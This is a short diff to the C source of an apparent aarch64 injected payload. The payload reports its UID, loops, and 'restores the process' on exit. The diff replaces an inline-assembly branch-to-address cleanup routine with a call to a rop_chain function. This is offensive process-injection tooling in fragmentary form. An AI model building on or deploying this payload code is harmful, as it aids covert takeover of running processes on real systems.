@@ -3,6 +3,7 @@
 #include <sys/user.h>
 #include <time.h>
 #include <stdint.h>
+#include "cleanup.h"
 #include "param_struct_aarch64.h"
 
 static long syscall_api(long n, long a0, long a1, long a2) {
@@ -38,23 +39,6 @@ static void sleep_s(int seconds) {
     syscall_api(SYS_nanosleep, (long)&ts, 0, 0);
 }
 
-__attribute__((noreturn, noinline, used))
-void clean_memory(struct cleanup *params)
-{
-    uintptr_t target = params->b_addr;
-
-    __asm__ volatile(
-        "mov x0, %x[ctx]\n"
-        "br  %x[target]\n"
-        :
-        : [ctx] "r"(params),
-          [target] "r"(target)
-        : "x0", "memory"
-    );
-
-    __builtin_unreachable();
-}
-
 int go(struct cleanup *params) {
     int uid = syscall_api(SYS_getuid, 0, 0, 0);
     print("[+] Payload running with UID: ");
@@ -66,7 +50,7 @@ int go(struct cleanup *params) {
             print("[+] Payload is running...\n");
         } else {
             print("[+] Payload quitting -- restoring process\n");
-            clean_memory(params);
+            rop_chain(params);
             break;
         }
         sleep_s(5);
